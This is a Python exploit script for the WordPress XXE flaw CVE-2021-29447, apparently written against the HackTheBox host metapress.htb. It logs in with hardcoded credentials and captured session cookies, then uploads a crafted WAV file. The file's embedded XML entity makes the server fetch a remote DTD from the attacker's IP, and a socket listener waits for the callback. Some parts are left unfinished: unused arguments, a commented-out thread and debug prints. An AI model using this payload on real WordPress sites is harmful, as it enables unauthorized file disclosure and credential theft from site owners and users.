#! /usr/bin/env python3

#### Title: Exploit Get Shell - WordPress
#### Author: 0xEtern4lW0lf
#### Created: 18 Dez 2022
#### Description: TEMPLATE
#### CVE-2021-29447

#### ========= MODULES =========

# hardler
import socket, telnetlib
from threading import Thread

# http lib
import requests, urllib, urllib3
urllib3.disable_warnings()

import argparse
import sys
import base64
import time


#### ========= VARIABLE =========

#### COLORS ####
RED = "\033[1;91m"
YELLOW = "\033[1;93m"
BLUE = "\033[1;94m"
GREEN = "\033[1;92m"
END = "\033[1;m "

## Set proxy [OPTIONAL]
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

#### ========= FUNCTION =========


## Weaponization and Attack

def listenPythonServer():
    print(f"\n{BLUE}[+] LISTEN: {YELLOW}Starting handler on {GREEN}9090 {BLUE}[+]{END}")
    tn = telnetlib.Telnet()
    print('\n01')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('\n02')
    s.bind(("0.0.0.0",9090))
    print('\n03')
    s.listen(1)
    print('\n04')
    conn, addr = s.accept()

    print('\n05')
    print(f"{BLUE}[+] LISTEN: {YELLOW}Receiving connection from {GREEN}{addr} {BLUE}[+]{END}")
#   tn.sock = conn
    print(f"\n{BLUE}[+] SUCCESS: {GREEN}HABEMUS SHELL! {BLUE}[+]{END}\n")

    print('\n06')
    try:
        msg = conn.recv(4048)
        print(msg)
    except:
        s.close()
    






# Session HTTP
r = requests.session()

'''Requests HTTP here'''


def loginAdmin():
    print(f"\n{BLUE}[+] LOGIN: {YELLOW}Let's login as admin! {BLUE}[+]{END}")
    url = f"http://metapress.htb/wp-login.php"

    
    headers = {
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'http://metapress.htb',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Referer': 'http://metapress.htb/wp-login.php',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'close'
        }

    cookies = {
        'cookie': 'PHPSESSID=vn4lvbrp08q2giu9ltt6qjkmol; wordpress_test_cookie=WP%20Cookie%20check'
        }


    data = {'log':'manager', 'pwd':'partylikearockstar', 'rememberme':'forever', 'wp-submit':'Log+In', 'testcookie':'1'}
    
    r.post(url, headers=headers, data=data, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

    print(f"{BLUE}[+] LOGIN: {YELLOW}Logged {GREEN}SUCCESSFULLY! {BLUE}[+]{END}")

    cookies=r.cookies
    r.get("http://metapress.htb/wp-admin/upload.php", headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)



def sendPayload():

    print('UPANDO PAYLOAD!')

    url = f"http://metapress.htb/wp-admin/async-upload.php"

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': 'http://metapress.htb/wp-admin/upload.php',
        'Content-Type': 'multipart/form-data; boundary=---------------------------67263521016585108752196551629',
        'Connection': 'close'
        }

    cookies = {
        'Cookie': 'wordpress_498b28797b9ccef61e19f54e27d9e6f4=manager%7C1673664715%7CvPVReM8AI2R4ST77M0uG6zkWVXHDZfHzOyzMYiHk169%7Ca7a88a601ba2c14a4f2de07b403626fbe76c8a27f0d5413f26dbd88de62c0e1d; wp-settings-time-2=1672371066; wp-settings-2=uploader%3D1%26mfold%3Df; PHPSESSID=145b3hurico7qhbhnt8g35hkun; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_498b28797b9ccef61e19f54e27d9e6f4=manager%7C1673664715%7CvPVReM8AI2R4ST77M0uG6zkWVXHDZfHzOyzMYiHk169%7Cbfe916fded4513f4472966d1fe0d1d02f39afadcc199df1dc404612a8e29bf56'
    }

    data = '''-----------------------------67263521016585108752196551629
Content-Disposition: form-data; name="name"

payload.wav
-----------------------------67263521016585108752196551629
Content-Disposition: form-data; name="action"

upload-attachment
-----------------------------67263521016585108752196551629
Content-Disposition: form-data; name="_wpnonce"

8100393317
-----------------------------67263521016585108752196551629
Content-Disposition: form-data; name="async-upload"; filename="payload.wav"
Content-Type: audio/x-wav

RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM 'http://10.10.14.7:9090/etern4lw0lf.dtd'>%remote;%init;%trick;]>\x00
-----------------------------67263521016585108752196551629--'''


    r.post(url, headers=headers, data=data, verify=False, cookies=cookies, allow_redirects=False, proxies=proxies)


def main():
    # Parse Arguments
    parser = argparse.ArgumentParser(description='HackTheBox TEMPLATE AutoShell - 0xEtern4lW0lf')
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-li', '--localip', help='Local ip address or hostname', required=True)
    parser.add_argument('-lp', '--localport', help='Local port to receive the shell', required=True)

    args = parser.parse_args()

    rhost = args.target
    lhost = args.localip
    lport = args.localport
    

#    thr = Thread(target=listenPythonServer)
#    thr.start()


    loginAdmin()

    sendPayload()


#### EXECUTION

if __name__ == '__main__':
    main()